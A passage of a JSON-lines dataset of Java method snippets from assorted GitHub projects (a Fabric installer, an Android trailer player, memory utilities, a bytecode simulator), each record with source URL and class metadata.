this.checkPointDb.addNodeRecord(nodeDO);                } catch (SQLException e) {                    // log.error(String.format(\"\u6dfb\u52a0\u8282\u70b9 %s \u89d2\u8272 %s \u5230\u6570\u636e\u5e93\u5931\u8d25\", ip, role.name().toLowerCase()), e);                    log.error(String.format(\"Failed when adding role 2 of node 1 to the database\", ip, role.name().toLowerCase()), e);                    e.printStackTrace();                }            }        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/ModeService.java", "stars": "7", "class": {"name": "ModeService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getInitDir", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getInitDir() {        return this.initDir.endsWith(File.separator) ? this.initDir : this.initDir + File.separator;    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/ModeService.java", "stars": "7", "class": {"name": "ModeService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getInstallPath", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getInstallPath() {        String installPath = this.installPath.endsWith(File.separator) ? this.installPath : this.installPath + File.separator;        return installPath;    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/ModeService.java", "stars": "7", "class": {"name": "ModeService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "startActivity", "params": ["Context", "String", "Media"], "throws": null, "modifiers": ["public", "static"], "return_type": "Intent", "snippet": "    public static Intent startActivity(Context context, String youTubeUrl, Media data) {        Intent i = new Intent(context, TVTrailerPlayerActivity.class);        i.putExtra(DATA, data);        i.putExtra(LOCATION, youTubeUrl);        context.startActivity(i);        return i;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVTrailerPlayerActivity.java", "stars": "4", "class": {"name": "TVTrailerPlayerActivity", "extends": "TVBaseActivity", "implements": ["TVVideoPlayerFragment"], "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onCreate(Bundle savedInstanceState) {        TVButterApplication.getAppContext()                .getComponent()                .inject(this);        super.onCreate(savedInstanceState, R.layout.activity_videoplayer);        mMedia = getIntent().getParcelableExtra(DATA);        String youTubeUrl = getIntent().getStringExtra(LOCATION);        createStreamInfo();        mPlayerFragment = (TVVideoPlayerFragment) getSupportFragmentManager().findFragmentById(R.id.fragment);        mPlaybackOverlayFragment = (TVPlaybackOverlayFragment) getSupportFragmentManager().findFragmentById(R.id.playback_overlay_fragment);        mPlaybackOverlayFragment.toggleSubtitleAction(false);        QueryYouTubeTask youTubeTask = new QueryYouTubeTask(youTubeManager);        youTubeTask.execute(youTubeManager.getYouTubeVideoId(youTubeUrl));    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVTrailerPlayerActivity.java", "stars": "4", "class": {"name": "TVTrailerPlayerActivity", "extends": "TVBaseActivity", "implements": ["TVVideoPlayerFragment"], "modifiers": ["public"]}}, {"method_name": "createStreamInfo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void createStreamInfo() {        mMedia = getIntent().getParcelableExtra(DATA);        mStreamInfo = new StreamInfo(mMedia, null, null, null, null, null);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVTrailerPlayerActivity.java", "stars": "4", "class": {"name": "TVTrailerPlayerActivity", "extends": "TVBaseActivity", "implements": ["TVVideoPlayerFragment"], "modifiers": ["public"]}}, {"method_name": "onOptionsItemSelected", "params": ["MenuItem"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onOptionsItemSelected(MenuItem item) {        switch (item.getItemId()) {            case android.R.id.home:                finish();                return true;        }        return super.onOptionsItemSelected(item);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVTrailerPlayerActivity.java", "stars": "4", "class": {"name": "TVTrailerPlayerActivity", "extends": "TVBaseActivity", "implements": ["TVVideoPlayerFragment"], "modifiers": ["public"]}}, {"method_name": "getResumePosition", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getResumePosition() {        return 0L;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVTrailerPlayerActivity.java", "stars": "4", "class": {"name": "TVTrailerPlayerActivity", "extends": "TVBaseActivity", "implements": ["TVVideoPlayerFragment"], "modifiers": ["public"]}}, {"method_name": "getInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "StreamInfo", "snippet": "    public StreamInfo getInfo() {        if(mStreamInfo == null) {            createStreamInfo();        }        return mStreamInfo;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVTrailerPlayerActivity.java", "stars": "4", "class": {"name": "TVTrailerPlayerActivity", "extends": "TVBaseActivity", "implements": ["TVVideoPlayerFragment"], "modifiers": ["public"]}}, {"method_name": "getService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TorrentService", "snippet": "    public TorrentService getService() {        return null;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVTrailerPlayerActivity.java", "stars": "4", "class": {"name": "TVTrailerPlayerActivity", "extends": "TVBaseActivity", "implements": ["TVVideoPlayerFragment"], "modifiers": ["public"]}}, {"method_name": "doInBackground", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "Uri", "snippet": "        protected Uri doInBackground(String... params) {            String uriStr = null;            String quality = \"17\";   // 3gpp medium quality, which should be fast enough to view over EDGE connection            String videoId = params[0];            if (isCancelled())                return null;            try {                WifiManager wifiManager = (WifiManager) TVTrailerPlayerActivity.this.getSystemService(Context.WIFI_SERVICE);                TelephonyManager telephonyManager = (TelephonyManager) TVTrailerPlayerActivity.this.getSystemService(Context.TELEPHONY_SERVICE);                // if we have a fast connection (wifi or 3g), then we'll get a high quality YouTube video                if (wifiManager.isWifiEnabled() && wifiManager.getConnectionInfo() != null && wifiManager.getConnectionInfo().getIpAddress() != 0) {                    quality = \"22\";                } else if (telephonyManager.getDataState() == TelephonyManager.DATA_CONNECTED &&                        (                                telephonyManager.getNetworkType() == TelephonyManager.NETWORK_TYPE_UMTS ||                                        telephonyManager.getNetworkType() == TelephonyManager.NETWORK_TYPE_HSUPA ||                                        telephonyManager.getNetworkType() == TelephonyManager.NETWORK_TYPE_HSPA ||                                        telephonyManager.getNetworkType() == TelephonyManager.NETWORK_TYPE_HSDPA ||                                        telephonyManager.getNetworkType() == TelephonyManager.NETWORK_TYPE_EVDO_0 ||                                        telephonyManager.getNetworkType() == TelephonyManager.NETWORK_TYPE_EVDO_A                        )                        ) {                    quality = \"18\";                }                if (isCancelled())                    return null;                ////////////////////////////////////                // calculate the actual URL of the video, encoded with proper YouTube token                uriStr = youTubeManager.calculateYouTubeUrl(quality, true, videoId);                if (isCancelled())                    return null;            } catch (Exception e) {                Log.e(this.getClass().getSimpleName(), \"Error occurred while retrieving information from YouTube.\", e);            }            if (uriStr != null) {                return Uri.parse(uriStr);            } else {                return null;            }        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVTrailerPlayerActivity.java", "stars": "4", "class": {"name": "QueryYouTubeTask", "extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"method_name": "onPostExecute", "params": ["Uri"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void onPostExecute(Uri result) {            super.onPostExecute(result);            try {                if (isCancelled())                    return;                if (result == null) {                    throw new RuntimeException(\"Invalid NULL Url.\");                }                mStreamInfo.setVideoLocation(URLDecoder.decode(result.toString(), \"utf-8\"));                mPlayerFragment.onMediaReady();            } catch (Exception e) {                Log.e(this.getClass().getSimpleName(), \"Error playing video!\", e);                if (!mShowedError) {                    showErrorAlert();                }            }        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVTrailerPlayerActivity.java", "stars": "4", "class": {"name": "QueryYouTubeTask", "extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"method_name": "showErrorAlert", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void showErrorAlert() {            try {                AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(TVTrailerPlayerActivity.this);                alertDialogBuilder.setTitle(R.string.comm_error);                alertDialogBuilder.setCancelable(false);                alertDialogBuilder.setMessage(R.string.comm_message);                alertDialogBuilder.setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {                    @Override                    public void onClick(DialogInterface dialog, int which) {                        TVTrailerPlayerActivity.this.finish();                    }                });                AlertDialog lDialog = alertDialogBuilder.create();                lDialog.show();            } catch (Exception e) {                Log.e(this.getClass().getSimpleName(), \"Problem showing error dialog.\", e);            }        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVTrailerPlayerActivity.java", "stars": "4", "class": {"name": "QueryYouTubeTask", "extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"method_name": "onProgressUpdate", "params": ["Void"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void onProgressUpdate(Void... pValues) {            super.onProgressUpdate(pValues);        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/tv/src/main/java/butter/droid/tv/activities/TVTrailerPlayerActivity.java", "stars": "4", "class": {"name": "QueryYouTubeTask", "extends": "AsyncTask", "implements": null, "modifiers": ["private"]}}, {"method_name": "newAnimal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Animal", "snippet": "    public Animal newAnimal() {        System.out.println(\"\u65b0\u725b\u51fa\u751f\");        return new Cattle();    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/creational/factorymethod/CattleFarm.java", "stars": "2", "class": {"name": "CattleFarm", "extends": null, "implements": ["AnimalFarm"], "modifiers": ["public"]}}, {"method_name": "startTransaction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void startTransaction(){\t\ttransaction = new XTransaction();\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XContext.java", "stars": "2", "class": {"name": "XContext", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "getTransaction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "XTransaction", "snippet": "\tpublic XTransaction getTransaction(){\t\treturn transaction;\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XContext.java", "stars": "2", "class": {"name": "XContext", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "endTransaction", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean endTransaction(boolean success){\t\tboolean flag = false;\t\tif(transaction != null && !transaction.isEnded()) {\t\t\tflag = transaction.end(success);\t\t\ttransaction = null;\t\t}\t\treturn flag;\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XContext.java", "stars": "2", "class": {"name": "XContext", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "submitTransaction", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean submitTransaction(){\t\tboolean flag = false;\t\tif(transaction != null && !transaction.isEnded()) {\t\t\tflag = transaction.end(true);\t\t\ttransaction = null;\t\t}\t\treturn flag;\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XContext.java", "stars": "2", "class": {"name": "XContext", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "canSystemGrantMemory", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean canSystemGrantMemory(final long xmx) {    final long freeMemSize = this.util.getOsTotalFreeMemorySize();    if (freeMemSize == 0) {      // Fail open.      // On the platforms that don't support the mem info file, the returned size will be 0.      return true;    }    if (freeMemSize - xmx < LOW_MEM_THRESHOLD) {      logger.info(String.format(          \"Free memory amount minus Xmx (%d - %d kb) is less than low mem threshold (%d kb), \"              + \"memory request declined.\",          freeMemSize, xmx, LOW_MEM_THRESHOLD));      return false;    }    return true;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/utils/SystemMemoryInfo.java", "stars": "18", "class": {"name": "SystemMemoryInfo", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "apply", "params": ["DynamicContext"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean apply(DynamicContext context) {    for (SqlNode sqlNode : ifSqlNodes) {      //modify by xuliang 20200403       sqlNode.apply(context);      //if (sqlNode.apply(context)) {        return true;      //}    }    if (defaultSqlNode != null) {      defaultSqlNode.apply(context);      return true;    }    return false;  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/ChooseSqlNode.java", "stars": "15", "class": {"name": "ChooseSqlNode", "extends": null, "implements": ["SqlNode"], "modifiers": ["public"]}}, {"method_name": "onScrollChanged", "params": ["int", "int", "int", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onScrollChanged(int l, int t, int oldl, int oldt) {        super.onScrollChanged(l, t, oldl, oldt);        if (mListener != null) {            Direction d = t > oldt ? Direction.DOWN : Direction.UP;            mListener.onScroll(t, d);        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/ObservableParallaxScrollView.java", "stars": "4", "class": {"name": "ObservableParallaxScrollView", "extends": "ParallaxScrollView", "implements": null, "modifiers": ["public"]}}, {"method_name": "setListener", "params": ["Listener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setListener(Listener listener) {        mListener = listener;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/ObservableParallaxScrollView.java", "stars": "4", "class": {"name": "ObservableParallaxScrollView", "extends": "ParallaxScrollView", "implements": null, "modifiers": ["public"]}}, {"method_name": "setOverScrollEnabled", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOverScrollEnabled(boolean enabled) {        mIsOverScrollEnabled = enabled;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/ObservableParallaxScrollView.java", "stars": "4", "class": {"name": "ObservableParallaxScrollView", "extends": "ParallaxScrollView", "implements": null, "modifiers": ["public"]}}, {"method_name": "isOverScrollEnabled", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isOverScrollEnabled() {        return mIsOverScrollEnabled;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/ObservableParallaxScrollView.java", "stars": "4", "class": {"name": "ObservableParallaxScrollView", "extends": "ParallaxScrollView", "implements": null, "modifiers": ["public"]}}, {"method_name": "overScrollBy", "params": ["int", "int", "int", "int", "int", "int", "int", "int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean overScrollBy(int deltaX, int deltaY, int scrollX, int scrollY, int scrollRangeX, int scrollRangeY,                                   int maxOverScrollX, int maxOverScrollY, boolean isTouchEvent) {        return super.overScrollBy(                deltaX,                deltaY,                scrollX,                scrollY,                scrollRangeX,                scrollRangeY,                mIsOverScrollEnabled ? maxOverScrollX : 0,                mIsOverScrollEnabled ? maxOverScrollY : 0,                isTouchEvent);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/ObservableParallaxScrollView.java", "stars": "4", "class": {"name": "ObservableParallaxScrollView", "extends": "ParallaxScrollView", "implements": null, "modifiers": ["public"]}}, {"method_name": "convertToGB", "params": ["long", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "    public static long convertToGB(long size, String unitFlag){        if(size < 0){            return -1L;        }        if(StringUtils.isNotBlank(unitFlag)){            StoreUnit storeUnit = UNIT_MAP.get(unitFlag.trim().toUpperCase());            if(null != storeUnit){                 return storeUnit.toGB(size);            }        }        return -1L;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/util/MemUtils.java", "stars": "23", "class": {"name": "MemUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "convertToMB", "params": ["long", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "    public static long convertToMB(long size, String unitFlag){        if(size < 0){            return -1L;        }        if(StringUtils.isNotBlank(unitFlag)){            StoreUnit storeUnit = UNIT_MAP.get(unitFlag.trim().toUpperCase());            if(null != storeUnit){                return storeUnit.toMB(size);            }        }        return -1L;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/util/MemUtils.java", "stars": "23", "class": {"name": "MemUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "convertToByte", "params": ["long", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "long", "snippet": "    public static long convertToByte(long size, String unitFlag){        if(size < 0){            return -1L;        }        if(StringUtils.isNotBlank(unitFlag)){            StoreUnit storeUnit = UNIT_MAP.get(unitFlag.trim().toUpperCase());            if(null != storeUnit){                return storeUnit.toB(size);            }        }        return -1L;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/util/MemUtils.java", "stars": "23", "class": {"name": "MemUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "x", "params": ["long", "long", "long"], "throws": null, "modifiers": ["static"], "return_type": "long", "snippet": "    static long x(long d, long m, long over){        if(d >  over){            return Long.MAX_VALUE;        }        if(d < -over){            return Long.MIN_VALUE;        }        return d * m;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/util/MemUtils.java", "stars": "23", "class": {"name": "MemUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "supported", "params": ["Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean supported(Type type) {\t\treturn TYPE_PRODUCERS.containsKey(type.getInternalName());\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "initialize", "params": ["List<AbstractInsnNode>", "TypeChecker", "Type"], "throws": null, "modifiers": ["public", "static"], "return_type": "SimulatedVirtualValue", "snippet": "\tpublic static SimulatedVirtualValue initialize(List<AbstractInsnNode> insns, TypeChecker typeChecker, Type type) {\t\treturn TYPE_PRODUCERS.get(type.getInternalName()).apply(insns, typeChecker);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "ofString", "params": ["AbstractInsnNode", "TypeChecker", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "SimulatedVirtualValue", "snippet": "\tpublic static SimulatedVirtualValue ofString(AbstractInsnNode insn, TypeChecker typeChecker, String value) {\t\treturn ofString(Collections.singletonList(insn), typeChecker, value);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "ofString", "params": ["List<AbstractInsnNode>", "TypeChecker", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "SimulatedVirtualValue", "snippet": "\tpublic static SimulatedVirtualValue ofString(List<AbstractInsnNode> insns, TypeChecker typeChecker, String value) {\t\treturn new SimulatedVirtualValue(insns, Type.getObjectType(\"java/lang/String\"), value, typeChecker);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "isValueResolved", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isValueResolved() {\t\treturn value != null;\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "ofStaticInvoke", "params": ["StaticInvokeFactory", "MethodInsnNode", "List<AbstractValue>", "TypeChecker"], "throws": ["SimFailedException"], "modifiers": ["public", "static"], "return_type": "AbstractValue", "snippet": "\tpublic static AbstractValue ofStaticInvoke(StaticInvokeFactory factory, MethodInsnNode insn,\t\t\t\t\t\t\t\t\t\t\t   List<? extends AbstractValue> arguments, TypeChecker typeChecker)\t\t\tthrows SimFailedException {\t\tString owner = insn.owner;\t\tString name = insn.name;\t\tString desc = insn.desc;\t\tif (factory != null)\t\t\treturn factory.invokeStatic(insn, arguments);\t\telse if (!isStaticMethodWhitelisted(owner, name, desc))\t\t\tthrow new SimFailedException(insn, \"Static method is not whitelisted.\");\t\ttry {\t\t\treturn invokeStatic(insn, owner, name, Type.getMethodType(desc),\t\t\t\t\targuments, typeChecker);\t\t} catch(Throwable t) {\t\t\tthrow new SimFailedException(insn, \"Failed to invoke method\", t);\t\t}\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "ofVirtualInvoke", "params": ["MethodInsnNode", "List<AbstractValue>"], "throws": ["SimFailedException"], "modifiers": ["public"], "return_type": "AbstractValue", "snippet": "\tpublic AbstractValue ofVirtualInvoke(MethodInsnNode insn, List<? extends AbstractValue> arguments)\t\t\tthrows SimFailedException {\t\t// Don't act on 'null' values\t\tif (isNull())\t\t\tthrow new SimFailedException(insn, \"Cannot act on null reference value\");\t\t// Don't try to do object stuff with non-objects\t\tif (isPrimitive())\t\t\tthrow new SimFailedException(insn, \"Cannot act on a primitive\");\t\t// Nullify voids\t\tType desc = Type.getMethodType(insn.desc);\t\tif (desc.equals(Type.VOID_TYPE))\t\t\treturn null;\t\t// Validate method context and arguments\t\tif (value == null)\t\t\tthrow new SimFailedException(insn, \"Context is null\");\t\tif (arguments.stream().anyMatch(AbstractValue::isValueUnresolved))\t\t\tthrow new SimFailedException(insn, \"One or more arguments are not resolved\");\t\t// Create new value from invoke\t\ttry {\t\t\treturn invokeVirtual(insn, insn.name, desc, arguments, currentValue[0]);\t\t} catch(Throwable t) {\t\t\tthrow new SimFailedException(insn, \"Failed to invoke method\", t);\t\t}\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "invokeVirtual", "params": ["MethodInsnNode", "String", "Type", "List<AbstractValue>", "Object"], "throws": ["ReflectiveOperationException"], "modifiers": ["private"], "return_type": "AbstractValue", "snippet": "\tprivate AbstractValue invokeVirtual(MethodInsnNode min, String name,\t\t\t\t\t\t\t\t\t\tType desc, List<? extends AbstractValue> arguments,\t\t\t\t\t\t\t\t\t\tObject invokeHost) throws ReflectiveOperationException {\t\t// Check against constructors\t\tType[] argTypes = desc.getArgumentTypes();\t\tif (name.equals(\"<init>\")) {\t\t\tfor (Constructor<?> c : invokeHost.getClass().getConstructors()) {\t\t\t\tif (c.getParameterCount() != argTypes.length)\t\t\t\t\tcontinue;\t\t\t\tboolean argsMatch = true;\t\t\t\tfor(int i = 0; i < argTypes.length; i++)\t\t\t\t\targsMatch &= argTypes[i].equals(Type.getType(c.getParameterTypes()[i]));\t\t\t\tif (argsMatch) {\t\t\t\t\tList<AbstractInsnNode> insns = distinct(combine(arguments.stream()\t\t\t\t\t\t\t.flatMap(arg -> arg.getInsns().stream())\t\t\t\t\t\t\t.collect(Collectors.toList()), getInsns(), min));\t\t\t\t\tObject[] argValues = arguments.stream()\t\t\t\t\t\t\t.map(AbstractValue::getValue).toArray();\t\t\t\t\tc.setAccessible(true);\t\t\t\t\tObject retVal = c.newInstance(argValues);\t\t\t\t\treturn new SimulatedVirtualValue(insns,\t\t\t\t\t\t\tType.getType(retVal.getClass()), retVal, typeChecker);\t\t\t\t}\t\t\t}\t\t}\t\t// Check against blacklist. They are do-nothing methods that we want to skip.\t\tfor (String[] def : BLACKLISTED_METHODS)\t\t\tif (def[0].equals(name) && def[1].equals(desc.getDescriptor()))\t\t\t\treturn this;\t\t// Check against normal methods\t\tType retType = desc.getReturnType();\t\tfor(Method mm : invokeHost.getClass().getMethods()) {\t\t\t// Skip non-matching methods\t\t\tif (!mm.getName().equals(name))\t\t\t\tcontinue;\t\t\tif (mm.getParameterCount() != argTypes.length)\t\t\t\tcontinue;\t\t\tif (isStatic(mm.getModifiers()))\t\t\t\tcontinue;\t\t\tboolean argsMatch = true;\t\t\tfor(int i = 0; i < argTypes.length; i++)\t\t\t\targsMatch &= argTypes[i].equals(Type.getType(mm.getParameterTypes()[i]));\t\t\t// Invoke if matched name/args.\t\t\tif (argsMatch) {\t\t\t\tObject[] argValues = arguments.stream()\t\t\t\t\t\t.map(AbstractValue::getValue).toArray();\t\t\t\tmm.setAccessible(true);\t\t\t\tObject retVal = mm.invoke(invokeHost, argValues);\t\t\t\t// Check void types.\t\t\t\tif (retType.getSort() == Type.VOID)\t\t\t\t\treturn null;\t\t\t\t// Handle return value.\t\t\t\tif (retVal != null) {\t\t\t\t\tList<AbstractInsnNode> insns = distinct(combine(arguments.stream()\t\t\t\t\t\t\t.flatMap(arg -> arg.getInsns().stream())\t\t\t\t\t\t\t.collect(Collectors.toList()), getInsns(), min));\t\t\t\t\tif (TypeUtil.isPrimitiveDesc(retType.getDescriptor())) {\t\t\t\t\t\t// Unbox primitive wrappers if descriptor calls for it.\t\t\t\t\t\treturn unboxed(insns, retVal);\t\t\t\t\t}  else {\t\t\t\t\t\t// Not a primitive\t\t\t\t\t\treturn new SimulatedVirtualValue(insns, Type.getType(retVal.getClass()), retVal, currentValue, typeChecker);\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t}\t\t// Invoke didn't occur, throw exception rather than return null\t\tthrow new IllegalStateException(\"Could not find method to simulate: \" +\t\t\t\ttype.getInternalName() + \".\" +  name + desc);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "copy", "params": ["AbstractInsnNode"], "throws": null, "modifiers": ["public"], "return_type": "AbstractValue", "snippet": "\tpublic AbstractValue copy(AbstractInsnNode insn) {\t\treturn new SimulatedVirtualValue(combine(getInsns(), insn), getType(), getValue(), currentValue, typeChecker);\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/main/java/me/coley/analysis/value/SimulatedVirtualValue.java", "stars": "12", "class": {"name": "SimulatedVirtualValue", "extends": "VirtualValue", "implements": null, "modifiers": ["public"]}}, {"method_name": "invokeStatic", "params": ["MethodInsnNode", "String", "String", "Type", "List<AbstractValue>", "TypeChecker"], "throws": ["ReflectiveOperationException"], "modifiers": ["private", "static"], "return_type": "AbstractValue", "snippet": "\tprivate static AbstractValue invokeStatic(MethodInsnNode min, String owner, String name, Type desc,\t\t\t\t\t\t\t\t\t\t\t  List<? extends AbstractValue> arguments, TypeChecker typeChecker)\t\t\tthrows ReflectiveOperationException {\t\tClass<?> cls = Class.forName(owner.replace('/', '.'));\t\tType retType = desc.getReturnType();\t\tType[] argTypes = desc.getArgumentTypes();\t\tfor(Method mm : cls.getMethods()) {\t\t\t// Skip non-matching methods\t\t\tif (!mm.getName().equals(name))\t\t\t\tcontinue;\t\t\tif (mm.getParameterCount() != argTypes.length)\t\t\t\tcontinue;\t\t\tif (!isStatic(mm.getModifiers()))\t\t\t\tcontinue;\t\t\tboolean argsMatch = true;\t\t\tfor(int i = 0; i < argTypes.length; i++)\t\t\t\targsMatch &= argTypes[i].equals(Type.getType(mm.getParameterTypes()[i]));\t\t\t// Invoke if matched name/args.\t\t\tif (argsMatch) {\t\t\t\tObject[] argValues = arguments.stream().map(AbstractValue::getValue).toArray();\t\t\t\tmm.setAccessible(true);\t\t\t\tObject retVal = mm.invoke(null, 